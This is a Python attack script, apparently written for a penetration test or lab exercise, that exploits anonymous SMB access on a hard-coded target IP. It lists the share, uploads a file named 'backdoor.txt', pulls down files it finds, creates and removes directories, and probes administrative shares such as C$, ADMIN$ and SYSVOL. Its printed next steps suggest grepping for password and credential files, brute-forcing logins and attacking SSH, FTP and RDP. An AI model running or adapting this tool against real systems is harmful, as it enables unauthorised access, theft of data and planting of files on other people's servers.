import subprocess
import os
import sys
import time

TARGET_IP = "12.13.14.3"
LOCAL_FILE = "backdoor.txt"
REMOTE_FILE = "backdoor.txt"
SHARE_NAME = "share"  # The share name from your output

def print_banner():
    print("\n" + "="*60)
    print("SMB ANONYMOUS FILE UPLOAD")
    print(f"Target: {TARGET_IP}")
    print(f"Share: {SHARE_NAME}")
    print("="*60)

def create_test_file():
    """Create test file to upload"""
    if not os.path.exists(LOCAL_FILE):
        print(f"[*] Creating {LOCAL_FILE}...")
        with open(LOCAL_FILE, "w") as f:
            f.write("=== ANONYMOUS SMB UPLOAD ===\n")
            f.write(f"Time: {time.ctime()}\n")
            f.write(f"Target: {TARGET_IP}\n")
            f.write(f"Share: {SHARE_NAME}\n")
            f.write("This file was uploaded via anonymous SMB access\n")
        print(f"[+] Created {LOCAL_FILE}")

def test_anonymous_access():
    """Test anonymous access to the share"""
    print("\n[*] Testing anonymous access to share...")
    
    # List contents of the share
    cmd = f"smbclient //{TARGET_IP}/{SHARE_NAME} -N -c 'ls'"
    print(f"[*] Command: {cmd}")
    
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    if result.returncode == 0:
        print("[+] Anonymous access successful!")
        print("[*] Share contents:")
        print(result.stdout)
        return True
    else:
        print("[-] Anonymous access failed")
        print(f"[*] Error: {result.stderr}")
        return False

def upload_file_anonymous():
    """Upload file using anonymous access"""
    print(f"\n[*] Uploading {LOCAL_FILE} to {SHARE_NAME}...")
    
    # Upload file
    upload_cmd = f"smbclient //{TARGET_IP}/{SHARE_NAME} -N -c 'put {LOCAL_FILE} {REMOTE_FILE}'"
    print(f"[*] Command: {upload_cmd}")
    
    result = subprocess.run(upload_cmd, shell=True, capture_output=True, text=True)
    
    if result.returncode == 0:
        print("[+] File uploaded successfully!")
        print(f"[+] Path: \\\\{TARGET_IP}\\{SHARE_NAME}\\{REMOTE_FILE}")
        return True
    else:
        print("[-] Upload failed")
        print(f"[*] Error: {result.stderr}")
        return False

def verify_upload():
    """Verify the file was uploaded"""
    print("\n[*] Verifying upload...")
    
    cmd = f"smbclient //{TARGET_IP}/{SHARE_NAME} -N -c 'ls {REMOTE_FILE}'"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    if result.returncode == 0:
        print("[+] File verified on server!")
        print("[*] File listing:")
        print(result.stdout)
        return True
    else:
        print("[-] File not found on server")
        return False

def download_file():
    """Try to download a file to confirm write access"""
    print("\n[*] Testing write access by downloading a file...")
    
    # First check if there are any files to download
    cmd = f"smbclient //{TARGET_IP}/{SHARE_NAME} -N -c 'ls'"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    if result.returncode == 0:
        # Look for files in the listing
        for line in result.stdout.split('\n'):
            if 'A' in line and not '<DIR>' in line:  # Look for files (not directories)
                try:
                    filename = line.split()[0]
                    if filename and '.' in filename:  # Likely a file
                        print(f"[*] Found file: {filename}")
                        
                        # Try to download it
                        download_cmd = f"smbclient //{TARGET_IP}/{SHARE_NAME} -N -c 'get {filename}'"
                        download_result = subprocess.run(download_cmd, shell=True, capture_output=True, text=True)
                        
                        if download_result.returncode == 0:
                            print(f"[+] Successfully downloaded {filename}")
                            return True
                except:
                    continue
    
    print("[-] No files found to download")
    return False

def explore_share():
    """Explore the share for more information"""
    print("\n" + "="*60)
    print("[*] EXPLORING SMB SHARE")
    print("="*60)
    
    commands = [
        ("Directory listing", f"smbclient //{TARGET_IP}/{SHARE_NAME} -N -c 'ls'"),
        ("Show all files", f"smbclient //{TARGET_IP}/{SHARE_NAME} -N -c 'ls -la'"),
        ("Disk free space", f"smbclient //{TARGET_IP}/{SHARE_NAME} -N -c 'du'"),
        ("Create test directory", f"smbclient //{TARGET_IP}/{SHARE_NAME} -N -c 'mkdir TEST_DIR_{int(time.time())}'"),
        ("Remove test directory", f"smbclient //{TARGET_IP}/{SHARE_NAME} -N -c 'rmdir TEST_DIR_{int(time.time())}'"),
    ]
    
    for desc, cmd in commands:
        print(f"\n[*] {desc}...")
        print(f"    Command: {cmd}")
        
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"    [+] Success:")
            print(result.stdout[:500])  # Show first 500 chars
        else:
            print(f"    [-] Failed: {result.stderr[:100]}")

def try_other_shares():
    """Try other common shares"""
    print("\n" + "="*60)
    print("[*] TESTING OTHER SHARES")
    print("="*60)
    
    common_shares = ['C$', 'ADMIN$', 'D$', 'E$', 'print$', 'NETLOGON', 'SYSVOL']
    
    for share in common_shares:
        print(f"\n[*] Testing {share}...")
        cmd = f"smbclient //{TARGET_IP}/{share} -N -c 'exit' 2>/dev/null"
        
        if subprocess.run(cmd, shell=True).returncode == 0:
            print(f"    [+] Accessible anonymously!")
        else:
            print(f"    [-] Not accessible")

def main():
    print_banner()
    
    # Create test file
    create_test_file()
    
    # Test anonymous access
    if not test_anonymous_access():
        print("\n[-] Cannot access share anonymously")
        print("[*] Try other shares...")
        try_other_shares()
        return
    
    # Try to upload file
    if upload_file_anonymous():
        # Verify upload
        verify_upload()
    else:
        print("\n[-] Upload failed - may be read-only share")
        print("[*] Testing write access by trying to download...")
        download_file()
    
    # Explore the share
    explore_share()
    
    # Try other shares
    try_other_shares()
    
    # Final summary
    print("\n" + "="*60)
    print("[*] NEXT STEPS")
    print("="*60)
    print("[*] Manual commands to try:")
    print(f"    1. smbclient //{TARGET_IP}/{SHARE_NAME} -N")
    print("       # Then use commands: ls, get, put, mkdir, rmdir")
    print(f"    2. smbclient -L //{TARGET_IP}/ -N")
    print("    3. Try to find interesting files:")
    print(f"       smbclient //{TARGET_IP}/{SHARE_NAME} -N -c 'ls' | grep -i 'pass\|cred\|conf\|bak'")
    print("\n[*] If you want to try authenticated access:")
    print("    4. Create better wordlists and run brute force")
    print("    5. Try other services (SSH, FTP, RDP)")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[-] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        sys.exit(1)
